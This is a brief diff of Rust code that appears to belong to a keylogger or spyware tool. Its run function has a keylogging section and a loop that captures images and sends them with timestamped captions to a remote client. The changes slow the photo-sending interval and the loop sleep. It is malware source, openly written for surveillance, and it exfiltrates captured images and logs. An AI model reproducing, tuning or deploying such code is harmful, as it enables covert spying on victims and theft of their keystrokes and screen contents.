@@ -23,7 +23,7 @@ async fn main() {
 
 async fn run() {
     const NUMBER_OF_THREADS: i32 = 4;
-    const SEND_PHOTO_INTERVAL_MILLIS: u128 = 3000;
+    const SEND_PHOTO_INTERVAL_MILLIS: u128 = 12000;
     const SEND_LOGS_INTERVAL_MILLIS: u128 = 5000;
 
     // keylogging
@@ -80,7 +80,7 @@ async fn run() {
                     client.send_image_withcaption(&filename, format!(
                         "[IMAGE] {} {:02} {:02} {:02}:{:02}:{:02}", now.year(), now.month(), now.day(), now.hour(), now.minute(), now.second())).await;
                 }
-                tokio::time::sleep(Duration::from_millis(30)).await;
+                tokio::time::sleep(Duration::from_millis(80)).await;
             }
         });
     }
